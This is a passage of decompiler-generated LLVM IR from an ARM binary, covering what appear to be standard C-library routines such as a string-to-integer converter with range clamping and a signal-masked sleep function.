  %v5_1419c = urem i32 %v1_14194, 256
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_14178, %dec_label_pc_14190, %bb42
  %v3_141cc = phi i32 [ %v1_14180, %dec_label_pc_14178 ], [ 40, %dec_label_pc_14190 ], [ %v5_1419c, %bb42 ]
  %v1_141a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_141a4 = add i32 %v0_141a4, 1
  store i32 %v1_141a4, i32* %r4.global-to-local, align 4
  %v6_141a8 = icmp slt i32 %v3_141cc, %v1_141a0
  br i1 %v6_141a8, label %dec_label_pc_141ac, label %dec_label_pc_141ec

dec_label_pc_141ac:                               ; preds = %bb43
  %v0_141ac = load i32, i32* %ip.global-to-local, align 4
  %v1_141ac = load i32, i32* %r8.global-to-local, align 4
  %v9_141ac = icmp eq i32 %v0_141ac, %v1_141ac
  br i1 %v9_141ac, label %.thread, label %bb44

.thread:                                          ; preds = %dec_label_pc_141ac
  br label %dec_label_pc_141bc

bb44:                                             ; preds = %dec_label_pc_141ac
  %v3_141ac = icmp ult i32 %v0_141ac, %v1_141ac
  br i1 %v3_141ac, label %dec_label_pc_141bc, label %dec_label_pc_141d4

dec_label_pc_141bc:                               ; preds = %bb44, %.thread
  %v4_141c41727 = phi i32 [ 1, %.thread ], [ 0, %bb44 ]
  %v1_141bc = load i32, i32* %sl.global-to-local, align 4
  %v3_141bc = icmp uge i32 %v3_141cc, %v1_141bc
  %v9_141bc = icmp eq i32 %v3_141cc, %v1_141bc
  %v2_141c0 = xor i1 %v3_141bc, true
  %v3_141c0 = or i1 %v9_141bc, %v2_141c0
  br i1 %v3_141c0, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_141bc
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_141bc, %bb45
  %v4_141c4 = phi i32 [ %v4_141c41727, %dec_label_pc_141bc ], [ 0, %bb45 ]
  %v2_141c4 = xor i1 %v9_141bc, true
  %v3_141c4 = and i1 %v3_141bc, %v2_141c4
  br i1 %v3_141c4, label %bb47, label %thread-pre-split

bb47:                                             ; preds = %bb46
  %v5_141c4 = urem i32 %v4_141c4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb46, %bb47
  %v0_141c8 = phi i32 [ %v5_141c4, %bb47 ], [ %v4_141c4, %bb46 ]
  %v2_141c8 = icmp eq i32 %v0_141c8, 0
  br i1 %v2_141c8, label %bb48, label %dec_label_pc_141d4

bb48:                                             ; preds = %thread-pre-split
  %v4_141cc = mul i32 %v0_141ac, %v1_141a0
  %v5_141cc = add i32 %v4_141cc, %v3_141cc
  store i32 %v5_141cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14174

dec_label_pc_141d4:                               ; preds = %bb44, %thread-pre-split
  %v0_141d4 = call i32 @function_13470()
  %v0_141d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_141d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_141d8 = and i32 %v1_141d8, %v0_141d8
  store i32 %v2_141d8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_141e4 = inttoptr i32 %v0_141d4 to i32*
  store i32 34, i32* %v2_141e4, align 4
  %v0_14174.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14174

dec_label_pc_141ec:                               ; preds = %bb43
  %v0_141ec.pre = load i32, i32* %sb.global-to-local, align 4
  %v2_141ec = icmp eq i32 %v0_141ec.pre, 0
  br i1 %v2_141ec, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_141ec
  %v1_141f0 = load i32, i32* %r6.global-to-local, align 4
  %v3_141f0 = inttoptr i32 %v0_141ec.pre to i32*
  store i32 %v1_141f0, i32* %v3_141f0, align 4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_141ec, %bb49
  %v0_141f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_141f4 = icmp eq i32 %v0_141f4, 0
  %. = select i1 %v2_141f4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_14200 = load i32, i32* %fp.global-to-local, align 4
  %v2_14200 = icmp eq i32 %v0_14200, 0
  %v0_14224.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_14200, label %dec_label_pc_1421c, label %bb53

bb53:                                             ; preds = %bb50
  %tmp58 = icmp ugt i32 %v0_14224.pre.pre, %.
  br i1 %tmp58, label %dec_label_pc_1420c, label %dec_label_pc_1421c

dec_label_pc_1420c:                               ; preds = %bb53
  %v0_1420c = call i32 @function_13470()
  %v2_14214 = inttoptr i32 %v0_1420c to i32*
  store i32 34, i32* %v2_14214, align 4
  %v0_14218 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14218, i32* %ip.global-to-local, align 4
  %v0_1421c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1421c

dec_label_pc_1421c:                               ; preds = %bb53, %bb50, %dec_label_pc_1420c
  %v0_14224.pre = phi i32 [ %v0_14224.pre.pre, %bb53 ], [ %v0_14218, %dec_label_pc_1420c ], [ %v0_14224.pre.pre, %bb50 ]
  %v0_1421c = phi i32 [ %v0_141f4, %bb53 ], [ %v0_1421c.pre, %dec_label_pc_1420c ], [ %v0_141f4, %bb50 ]
  %v2_1421c = icmp eq i32 %v0_1421c, 0
  br i1 %v2_1421c, label %dec_label_pc_1421c._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_1421c
  %v2_14220 = sub i32 0, %v0_14224.pre
  store i32 %v2_14220, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1421c._crit_edge

dec_label_pc_1421c._crit_edge:                    ; preds = %dec_label_pc_1421c, %bb54
  %v0_14224 = phi i32 [ %v2_14220, %bb54 ], [ %v0_14224.pre, %dec_label_pc_1421c ]
  %v2_14228 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14228, i32* @r4, align 4
  ret i32 %v0_14224

; uselistorder directives
  uselistorder i32 %v0_14224.pre, { 1, 0 }
  uselistorder i32 %v0_14224.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v0_141ec.pre, { 1, 0 }
  uselistorder i32 %v4_141c4, { 1, 0 }
  uselistorder i1 %v3_141bc, { 1, 0 }
  uselistorder i32 %v1_141bc, { 1, 0 }
  uselistorder i32 %v1_141a4, { 1, 0 }
  uselistorder i32 %v1_14188, { 1, 0 }
  uselistorder i32 %v1_14180, { 1, 0 }
  uselistorder i32 %v0_14174, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 5, 6, 0, 1, 3, 2, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 ()* @function_12ae8, { 3, 2, 4, 1, 0 }
  uselistorder i32 (i32, i32)* @function_12bf8, { 5, 2, 1, 3, 8, 7, 6, 4, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder i8 32, { 0, 8, 14, 9, 10, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder label %dec_label_pc_1421c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1421c, { 2, 0, 1 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_141d4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14178, { 1, 0 }
  uselistorder label %dec_label_pc_14174, { 1, 0 }
  uselistorder label %dec_label_pc_14148, { 1, 0 }
  uselistorder label %dec_label_pc_140ec, { 1, 0 }
}

define i32 @function_14230(i32 %arg1) local_unnamed_addr {
dec_label_pc_14230:
  %stack_var_-16 = alloca i32, align 4
  %v2_14230 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_14230, i32* @r0, align 4
  %v8_1424c = call i32 @function_144dc(i32 %v2_14230, i32 ptrtoint (i32* @global_var_144d4.572 to i32), i32 ptrtoint (i32* @global_var_1e370.626 to i32), i32 83164, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_1425c = call i32 @function_144d4()
  %v2_14264 = load i32, i32* @global_var_1e444.630, align 4
  %v2_14268 = icmp eq i32 %v2_14264, 0
  br i1 %v2_14268, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_14230
  call void @__pseudo_branch(i32 %v2_14264)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14230, %bb
  store i32 %v2_14230, i32* @r0, align 4
  %v8_14288 = call i32 @function_144dc(i32 %v2_14230, i32 1, i32 ptrtoint (i32* @global_var_1e370.626 to i32), i32 83164, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_14288, i32* @r0, align 4
  %v1_1428c = call i32 @function_14468(i32 %v8_14288)
  %v0_142a0 = load i32, i32* @r4, align 4
  %v1_142a4 = call i32 @function_148d8(i32 %v0_142a0)
  unreachable

; uselistorder directives
  uselistorder i32 %v2_14230, { 1, 0, 3, 2 }
  uselistorder i32 ()* @function_144d4, { 4, 3, 2, 1, 18, 17, 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 21, 20, 19 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_144dc, { 1, 0, 5, 4, 2, 3 }
  uselistorder i32 83164, { 1, 0, 3, 4, 2, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1e370.626 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_144d4.572 to i32), { 0, 3, 1, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_142c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_142c4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_142c4 = load i32, i32* @r4, align 4
  store i32 %v3_142c4, i32* %stack_var_-20, align 4
  %v6_142c4 = load i32, i32* @r5, align 4
  %v9_142c4 = load i32, i32* @r6, align 4
  %v16_142c4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* @ip, align 4
  %v2_142c8 = icmp eq i32 %arg1, 0
  %v2_142cc = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_142c8, label %dec_label_pc_14450, label %dec_label_pc_142e4.preheader

dec_label_pc_142e4.preheader:                     ; preds = %dec_label_pc_142c4
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_142ec17 = add i32 %v16_142c4, 124
  br label %dec_label_pc_142dc

dec_label_pc_142dc:                               ; preds = %dec_label_pc_142e4.preheader, %dec_label_pc_142dc
  %v5_142ec18 = phi i32 [ %v5_142ec17, %dec_label_pc_142e4.preheader ], [ %v5_142ec, %dec_label_pc_142dc ]
  %v2_142e0 = add i32 %v5_142ec18, -136
  %v3_142e0 = inttoptr i32 %v2_142e0 to i32*
  store i32 0, i32* %v3_142e0, align 4
  %v0_142e4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_142e4 = add i32 %v0_142e4.pre, -1
  store i32 %v1_142e4, i32* %r1.global-to-local, align 4
  %v6_142e4 = icmp slt i32 %v1_142e4, 0
  %v4_142ec = mul i32 %v1_142e4, 4
  %v5_142ec = add i32 %v4_142ec, %v16_142c4
  br i1 %v6_142e4, label %dec_label_pc_142f4, label %dec_label_pc_142dc

dec_label_pc_142f4:                               ; preds = %dec_label_pc_142dc
  %v2_142f4 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_142f4, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_14304 = load i32, i32* @ip, align 4
  store i32 %v0_14304, i32* %stack_var_-28, align 4
  %v0_1430c = call i32 @function_138f8()
  store i32 %v0_1430c, i32* %r0.global-to-local, align 4
  %v1_14310 = load i32, i32* @r5, align 4
  %v5_14314 = icmp slt i32 %v0_1430c, %v1_14310
  br i1 %v5_14314, label %dec_label_pc_14458, label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %dec_label_pc_142f4
  %v2_14318 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_14318, i32* @r4, align 4
  store i32 %v1_14310, i32* %r0.global-to-local, align 4
  store i32 %v2_142f4, i32* %r1.global-to-local, align 4
  %v3_14328 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_14328 = call i32 @function_13118(i32 %v1_14310, %_TYPEDEF_sigset_t* %v3_14328, i32 %v2_14318)
  store i32 %v4_14328, i32* %r0.global-to-local, align 4
  %v1_1432c = load i32, i32* @r5, align 4
  %v9_1432c = icmp eq i32 %v4_14328, %v1_1432c
  br i1 %v9_1432c, label %dec_label_pc_14334, label %dec_label_pc_14458

dec_label_pc_14334:                               ; preds = %dec_label_pc_14318
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_14318, i32* %r0.global-to-local, align 4
  %v2_1433c = call i32 @function_138d4(i32 %v2_14318, i32 17)
  store i32 %v2_1433c, i32* %r0.global-to-local, align 4
  %v1_14340 = load i32, i32* @r5, align 4
  %v9_14340 = icmp eq i32 %v2_1433c, %v1_14340
  br i1 %v9_14340, label %dec_label_pc_14358.preheader, label %dec_label_pc_14334.dec_label_pc_14420_crit_edge

dec_label_pc_14334.dec_label_pc_14420_crit_edge:  ; preds = %dec_label_pc_14334
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_14420

dec_label_pc_14358.preheader:                     ; preds = %dec_label_pc_14334
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14350

dec_label_pc_14350:                               ; preds = %dec_label_pc_14358.preheader, %dec_label_pc_14350
  %v5_1436016 = phi i32 [ %v5_142ec17, %dec_label_pc_14358.preheader ], [ %v5_14360, %dec_label_pc_14350 ]
  %v2_14354 = add i32 %v5_1436016, -136
  %v3_14354 = inttoptr i32 %v2_14354 to i32*
  store i32 0, i32* %v3_14354, align 4
  %v0_14358.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14358 = add i32 %v0_14358.pre, -1
  store i32 %v1_14358, i32* %r1.global-to-local, align 4
  %v6_14358 = icmp slt i32 %v1_14358, 0
  %v4_14360 = mul i32 %v1_14358, 4
  %v5_14360 = add i32 %v4_14360, %v16_142c4
  br i1 %v6_14358, label %dec_label_pc_14368, label %dec_label_pc_14350

dec_label_pc_14368:                               ; preds = %dec_label_pc_14350
  store i32 %v2_142f4, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_14370 = call i32 @function_138f8()
  store i32 %v0_14370, i32* %r0.global-to-local, align 4
  %v1_14374 = icmp slt i32 %v0_14370, 0
  br i1 %v1_14374, label %dec_label_pc_14458, label %dec_label_pc_1437c

dec_label_pc_1437c:                               ; preds = %dec_label_pc_14368
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_14388 = call i32 @function_147c0(i32 17, i32* null, i32 %v2_142cc)
  store i32 %v4_14388, i32* %r0.global-to-local, align 4
  %v1_1438c = icmp slt i32 %v4_14388, 0
  br i1 %v1_1438c, label %dec_label_pc_14394, label %dec_label_pc_143bc

dec_label_pc_14394:                               ; preds = %dec_label_pc_1437c
  %v0_14394 = call i32 @function_13470()
  store i32 %v2_14318, i32* %r1.global-to-local, align 4
  store i32 %v0_14394, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_143a8 = inttoptr i32 %v0_14394 to i32*
  %v2_143a8 = load i32, i32* %v1_143a8, align 4
  store i32 %v2_143a8, i32* @r4, align 4
  %v3_143ac = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_143ac = call i32 @function_13118(i32 2, %_TYPEDEF_sigset_t* %v3_143ac, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_143b4 = load i32, i32* @r4, align 4
  %v1_143b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_143b4 = inttoptr i32 %v1_143b4 to i32*
  store i32 %v0_143b4, i32* %v2_143b4, align 4
  %v17_14460.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1445c

dec_label_pc_143bc:                               ; preds = %dec_label_pc_1437c
  %v2_143bc = load i32, i32* %stack_var_-424, align 4
  %v7_143c0 = icmp eq i32 %v2_143bc, 1
  %v2_143c8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_143c8, i32* @r4, align 4
  br i1 %v7_143c0, label %dec_label_pc_143d0, label %dec_label_pc_14404

dec_label_pc_143d0:                               ; preds = %dec_label_pc_143bc
  store i32 %v2_143c8, i32* %r1.global-to-local, align 4
  store i32 %v2_143c8, i32* %r0.global-to-local, align 4
  %v2_143d8 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_143d8 = call i32 @function_14c5c(%timespec* %v2_143d8, i32 %v2_143c8)
  store i32 %v3_143d8, i32* %r0.global-to-local, align 4
  store i32 %v3_143d8, i32* %r6.global-to-local, align 4
  %v0_143e0 = call i32 @function_13470()
  store i32 %v2_14318, i32* %r1.global-to-local, align 4
  store i32 %v0_143e0, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_143f4 = inttoptr i32 %v0_143e0 to i32*
  %v2_143f4 = load i32, i32* %v1_143f4, align 4
  store i32 %v2_143f4, i32* @r4, align 4
  %v3_143f8 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_143f8 = call i32 @function_13118(i32 2, %_TYPEDEF_sigset_t* %v3_143f8, i32 0)
  store i32 %v4_143f8, i32* %r0.global-to-local, align 4
  %v0_143fc = load i32, i32* @r4, align 4
  %v1_143fc = load i32, i32* %r5.global-to-local, align 4
  %v2_143fc = inttoptr i32 %v1_143fc to i32*
  store i32 %v0_143fc, i32* %v2_143fc, align 4
  %v0_1442c.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1442c

dec_label_pc_14404:                               ; preds = %dec_label_pc_143bc
  store i32 %v2_14318, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_14410 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_14410 = call i32 @function_13118(i32 2, %_TYPEDEF_sigset_t* %v3_14410, i32 0)
  store i32 %v4_14410, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14420

dec_label_pc_14420:                               ; preds = %dec_label_pc_14334.dec_label_pc_14420_crit_edge, %dec_label_pc_14404
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_14334.dec_label_pc_14420_crit_edge ], [ %v2_143c8, %dec_label_pc_14404 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_14424 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_14424 = call i32 @function_14c5c(%timespec* %v2_14424, i32 %storemerge.pre-phi)
  store i32 %v3_14424, i32* %r0.global-to-local, align 4
  store i32 %v3_14424, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1442c

dec_label_pc_1442c:                               ; preds = %dec_label_pc_143d0, %dec_label_pc_14420
  %v0_1442c = phi i32 [ %v0_1442c.pr, %dec_label_pc_143d0 ], [ %v3_14424, %dec_label_pc_14420 ]
  %v2_1442c = icmp eq i32 %v0_1442c, 0
  br i1 %v2_1442c, label %dec_label_pc_14450, label %dec_label_pc_14434

dec_label_pc_14434:                               ; preds = %dec_label_pc_1442c
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1443c = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_1443c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1445c

dec_label_pc_14450:                               ; preds = %dec_label_pc_142c4, %dec_label_pc_1442c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1445c

dec_label_pc_14458:                               ; preds = %dec_label_pc_14318, %dec_label_pc_14368, %dec_label_pc_142f4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1445c

dec_label_pc_1445c:                               ; preds = %dec_label_pc_14434, %dec_label_pc_14450, %dec_label_pc_14394, %dec_label_pc_14458
  %v17_14460 = phi i32 [ %v3_1443c, %dec_label_pc_14434 ], [ 0, %dec_label_pc_14450 ], [ %v17_14460.pre, %dec_label_pc_14394 ], [ -1, %dec_label_pc_14458 ]
  %v2_14460 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14460, i32* @r4, align 4
  store i32 %v6_142c4, i32* @r5, align 4
  store i32 %v9_142c4, i32* @r6, align 4
  ret i32 %v17_14460

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_143c8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_14358, { 0, 2, 1 }
  uselistorder i32 %v2_14318, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_14310, { 1, 0, 2 }
  uselistorder i32 %v1_142e4, { 0, 2, 1 }
  uselistorder i32 %v16_142c4, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 10, 9, 0, 11, 12, 14, 13, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 1, 9, 8, 11, 10, 3, 12, 14, 15, 13, 17, 16, 18, 22, 19, 2, 20, 21, 0 }
  uselistorder i32 (i32, i32*, i32)* @function_147c0, { 1, 2, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @function_13118, { 1, 2, 3, 4, 0 }
  uselistorder i32 ()* @function_138f8, { 2, 1, 0, 3, 4 }
  uselistorder i32 -136, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1445c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_14458, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14450, { 1, 0 }
  uselistorder label %dec_label_pc_1442c, { 1, 0 }
  uselistorder label %dec_label_pc_14420, { 1, 0 }
  uselistorder label %dec_label_pc_14350, { 1, 0 }
  uselistorder label %dec_label_pc_142dc, { 1, 0 }
}

define i32 @function_14468(i32 %arg1) local_unnamed_addr {
dec_label_pc_14494:
  %stack_var_-8 = alloca i32, align 4
  %v3_14468 = load i32, i32* @r4, align 4
  store i32 %v3_14468, i32* %stack_var_-8, align 4
  %v2_14498 = load i32, i32* @global_var_1e454.639, align 4
  %v2_1449c = icmp eq i32 %v2_14498, 0
  br i1 %v2_1449c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_14494
  call void @__pseudo_branch(i32 %v2_14498)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14494, %bb
  %v2_144ac = load i32, i32* @global_var_1e458.641, align 4
  %v2_144b0 = icmp eq i32 %v2_144ac, 0
  br i1 %v2_144b0, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_144b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_144b4, i32* @r4, align 4
  %v9_144b4 = load i32, i32* @r0, align 4
  ret i32 %v9_144b4

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_144ac)
  %v2_144c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_144c0, i32* @r4, align 4
  %v8_144c0 = load i32, i32* @r0, align 4
  ret i32 %v8_144c0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_144d4() local_unnamed_addr {
dec_label_pc_144d4:
  ret i32 0
}

define i32 @function_144dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_144dc:
  %v1_144dc = load i32, i32* @r0, align 4
  ret i32 %v1_144dc
}

define i32 @function_144e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_144e0:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_144e0 = load i32, i32* @r4, align 4
  store i32 %v3_144e0, i32* %stack_var_-12, align 4
  %v6_144e0 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_144f0 = call i32 @function_12dac(i32 %arg1, i32 1)
  %v7_144f4 = icmp eq i32 %v2_144f0, -1
  br i1 %v7_144f4, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_144e0
  %v3_144f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_144f8, i32* @r4, align 4
  store i32 %v6_144e0, i32* @r5, align 4
  ret i32 %v2_144f0

bb4:                                              ; preds = %dec_label_pc_144e0
  %v0_144fc = load i32, i32* @r4, align 4
  %v4_14504 = call i32 @function_12fc8(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_15f0c.644, i32 0, i32 0), i32 %v0_144fc)
  %v1_14508 = load i32, i32* %r5.global-to-local, align 4
  %v9_14508 = icmp eq i32 %v4_14504, %v1_14508
  br i1 %v9_14508, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_1450c = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_1450c, i32* @r4, align 4
  store i32 %v6_144e0, i32* @r5, align 4
  ret i32 %v4_14504

bb6:                                              ; preds = %bb4
  %v0_14510 = call i32 @function_13f3c()
  %v0_14514 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14514, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v2_14514 = load i32, i32* @ip, align 4
  %v5_14514 = mul i32 %v2_14514, 1073741824
  %v6_14514 = and i32 %v5_14514, %v0_144fc
  store i32 %v6_14514, i32* @r5, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_14510

; uselistorder directives
  uselistorder i32 %v2_144f0, { 1, 0 }
  uselistorder i32 %v6_144e0, { 1, 0 }
  uselistorder i1* @cpsr_z, { 7, 0, 9, 8, 4, 5, 1, 2, 3, 6 }
  uselistorder i32 ()* @function_13f3c, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @function_12fc8, { 9, 6, 0, 1, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 (i32, i32)* @function_12dac, { 0, 9, 4, 3, 6, 5, 13, 12, 11, 10, 8, 7, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_14518(i32 %arg1) local_unnamed_addr {
dec_label_pc_14518:
  %v2_1451c = load i32, i32* @global_var_1e45c.646, align 4
  %v2_14520 = icmp eq i32 %v2_1451c, 0
  br i1 %v2_14520, label %bb2, label %bb

bb:                                               ; preds = %dec_label_pc_14518
  %v6_1452c = load i32, i32* @r0, align 4
  ret i32 %v6_1452c

bb2:                                              ; preds = %dec_label_pc_14518
  store i32 1, i32* @global_var_1e45c.646, align 4
  store i32 4096, i32* @global_var_1e450.597, align 4
  ret i32 undef
}

define i32 @function_14574(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14574:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v4_14578 = mul i32 %arg2, 4
  %v5_14578 = add i32 %tmp, %v4_14578
  %v2_1457c = load i32, i32* %arg3, align 4
  %v2_14580 = ptrtoint i32* %stack_var_-120 to i32
  %v1_14584 = add i32 %v5_14578, 4
  %v9_14588 = icmp eq i32 %v1_14584, %v2_1457c
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg7, i32* @global_var_1e448.651, align 4
  store i32 %v1_14584, i32* @global_var_1e44c.653, align 4
  store i32 %arg6, i32* @global_var_1e458.641, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_14588, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_14574
  store i32 %v5_14578, i32* @global_var_1e44c.653, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_14574, %bb
  %v2_145c8 = bitcast i32* %stack_var_-120 to i8*
  %v3_145c8 = call i32 @function_134d0(i8* %v2_145c8, i32 0)
  %storemerge.pre = load i32, i32* @global_var_1e44c.653, align 4
  br label %dec_label_pc_145d8

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145d8, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_145d8, %dec_label_pc_145d8 ]
  %v1_145d8 = inttoptr i32 %storemerge to i32*
  %v2_145d8 = load i32, i32* %v1_145d8, align 4
  %v4_145d8 = add i32 %storemerge, 4
